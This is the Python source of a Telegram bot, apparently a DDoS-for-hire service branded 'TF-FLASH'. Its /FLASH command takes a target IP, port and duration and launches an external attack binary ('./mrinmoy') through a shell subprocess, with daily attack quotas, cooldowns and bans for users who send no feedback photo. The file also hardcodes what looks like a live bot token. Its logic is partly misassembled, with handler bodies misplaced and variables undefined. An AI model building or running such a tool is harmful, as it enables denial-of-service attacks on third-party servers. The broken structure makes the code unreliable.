import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

CHANNEL_ID = '-1002368955859'
ADMIN_IDS = '7479349647'
TOKEN = '7475040161:AAG_ojN4DOWHqNJvERwGH1H4Amox4TWsT3A'
bot = telebot.TeleBot(TOKEN)

try:
    bot.get_me()
    print("Bot token is valid!")
except Exception as e:
    print(f"Error: {e}")

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 10  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [7479349647]

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

@bot.message_handler(commands=['start'])
def start_command(message):
    user_name = message.from_user.first_name or "User"
    chat_id = message.chat.id

    # Check if the user is a member of the channel
    try:
        user_status = bot.get_chat_member(CHANNEL_ID, message.from_user.id).status
        if user_status not in ['member', 'administrator', 'creator']:
            # User is not a member of the channel
            bot.send_message(
                chat_id,
                f"🚨 To use this bot, you must join our Telegram channel: [Join Here](https://t.me/+t_GmBHP91YY0ZjVl).",
                parse_mode="Markdown",
            )
            return
    except Exception as e:
        # Handle errors (e.g., bot isn't an admin in the channel)
        bot.send_message(
            chat_id,
            "❌ Error checking your membership. Ensure the bot is an admin in the channel\n\nhttps://t.me/+t_GmBHP91YY0ZjVl.",
        )
        return

    # Stylish welcome message for members
    welcome_message = (
        f"🌟 Welcome, {user_name}! 🌟\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Available Commands:\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 /FLASH - Perform advanced actions.\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚙️ _Stay tuned for updates!_\n\n"
        "🚀 Developed by: [Team TF-FLASH](https://t.me/+t_GmBHP91YY0ZjVl)\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

    bot.send_message(chat_id, welcome_message, parse_mode="Markdown")

# Handler for photos sent by users
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"
    user_photos[user_id] = True  # Mark that the user has sent a photo as feedback
    bot.reply_to(message, f"🚀 BETA, {user_name}, ACHA HOGYA TUNE FEEDBACK DIYA WARNA BAN KAHA TA! \n\nYour next attack is now allowed.")

@bot.message_handler(commands=['FLASH'])
def FLASH_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @TF_FLASH92 ( TUMHARE_PAPA ) | ]")
        return

    # Reset counts daily
    reset_daily_counts()

# Command to add a new group/channel
@bot.message_handler(commands=['addTF'])
def add_group_command(message):
    user_id = message.from_user.id  # Get the user ID of the sender

    # Check if the user is an admin
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to add groups.")
        return

    try:
        # Split command arguments
        args = message.text.split()[1:]  # Skip the command itself
        if len(args) != 1:
            raise ValueError("Usage: /addTF <channel_id>")

        # Extract and validate the new channel ID
        new_channel_id = args[0]
        if not new_channel_id.startswith('-100'):
            raise ValueError("Invalid channel ID. Must start with '-100'.")

        # Check if the channel ID is already added
        if new_channel_id in CHANNEL_IDS:
            bot.reply_to(message, "⚠️ This channel/group is already added.")
        else:
            # Add the new channel ID to the list
            CHANNEL_IDS.append(new_channel_id)
            bot.reply_to(message, f"✅ Channel/Group {new_channel_id} has been successfully added.")

    except Exception as e:
        bot.reply_to(message, f"❌ APKA BAAP @TF_FLASH92: {e}")

# Command to remove a group/channel
@bot.message_handler(commands=['removeTF'])
def remove_group_command(message):
    user_id = message.from_user.id  # Get the user ID of the sender

    # Check if the user is an admin
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to remove groups.")
        return

    try:
        # Split command arguments
        args = message.text.split()[1:]  # Skip the command itself
        if len(args) != 1:
            raise ValueError("Usage: /removeTF <channel_id>")

        # Extract the channel ID to be removed
        channel_id_to_remove = args[0]
        if channel_id_to_remove in CHANNEL_IDS:
            CHANNEL_IDS.remove(channel_id_to_remove)  # Remove the channel ID from the list
            bot.reply_to(message, f"✅ Channel/Group {channel_id_to_remove} has been successfully removed.")
        else:
            bot.reply_to(message, "⚠️ This channel/group is not in the list.")

    except Exception as e:
        bot.reply_to(message, f"❌ APKA BAAP @TF_FLASH92: {e}")

    # Check if the user is banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 10)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 10} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 10} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤??𝙚 𝙩𝙧𝙮𝙞𝙣?? 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("₣𝙻Å𝕊Ｈ 𝙋Ʋᴮ𝙻Ī𝘾_𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /FLASH <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")

        target_ip, target_port, user_duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("Invalid duration. Must be a positive integer.")

        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 150
        bot.send_message(
            message.chat.id,
            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n\n🚀 𝙃𝙞 {user_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 {remaining_attacks} 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙡𝙚𝙛𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮!\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
        )

        # Log the attack started message
        logging.info(f"Attack started by {user_name}: ./mrinmoy {target_ip} {target_port} {default_duration} 877")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./mrinmoy {target_ip} {target_port} {duration} 877"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\nFREE KA USE KAR  <> 𝗧𝗲𝗮𝗺 TF-FLASH™")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")